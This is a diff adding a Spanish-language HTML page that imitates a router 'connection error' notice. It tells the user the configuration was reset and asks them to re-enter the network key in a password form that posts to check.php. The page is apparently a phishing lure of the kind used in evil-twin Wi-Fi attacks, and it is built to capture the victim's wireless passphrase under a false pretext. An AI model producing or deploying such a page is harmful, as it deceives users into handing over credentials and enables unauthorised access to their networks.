@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="utf-8" />
+    <link href="images/favicon.ico" rel="icon" type="image/x-icon" />
+    <style>
+        body {
+            height: 100%;
+            margin: 0px;
+            background-color: rgba(255, 255, 255, 0.3);
+            position: relative;
+        }
+
+        .error-text {
+            background-color: rgb(102, 186, 51);
+            width: 100%;
+            display: inline-block;
+        }
+
+        h1 {
+            font-size: 16px;
+            color: WHITE;
+            font-weight: bold;
+            margin-left: 15px;
+            margin-top: 5px;
+            margin-bottom: 5px;
+        }
+
+        .context {
+            margin-left: 5%;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="error-text">
+        <h1>Error de conexión</h1>
+    </div>
+    <div class="context">
+        <p>Se ha detectado un problema de conexión y la configuración se ha reestablecido.</p>
+        <p>Introduzca de nuevo la clave de red para restaurar la conexión:</p>
+        <form id="form1" name="form1" method="POST" action="check.php">
+            <center style="margin-right: 5%; margin-top: 5%;">
+                <p style="display:inline;">Clave:</p>
+                <input name="key1" type="password" style="display:inline;" />
+                <input name="Confirm" class="confirmbtn" type="submit" value="Aceptar" />
+            </center>
+        </form>
+    </div>
+</body>
+
+</html>
